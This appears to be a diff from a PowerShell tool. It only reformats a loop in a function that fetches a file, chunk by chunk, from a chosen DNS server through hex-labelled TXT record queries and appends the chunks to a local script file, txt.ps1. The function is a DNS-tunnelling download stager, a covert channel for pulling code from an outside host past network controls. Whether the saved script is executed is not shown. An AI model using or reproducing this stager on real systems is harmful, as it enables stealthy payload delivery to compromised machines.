@@ -49,7 +49,11 @@ function pull_file($size=255){
     $h = ''
     $index = 0
     $file_size = $(Resolve-DnsName -Server $server -Name "73697a65.$name" -Type TXT).Strings
-    foreach ($i in 1..[int]"$file_size") {        $x = $(Resolve-DnsName -Server $server -Name "66696c65.$index.$name" -Type TXT).Strings        $index += $size        $x | Add-Content -Path '.\txt.ps1'    }
+    foreach ($i in 1..[int]"$file_size") {
+        $x = $(Resolve-DnsName -Server $server -Name "66696c65.$index.$name" -Type TXT).Strings
+        $index += $size    
+        $x | Add-Content -Path '.\txt.ps1'
+    }
     $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
 }
 
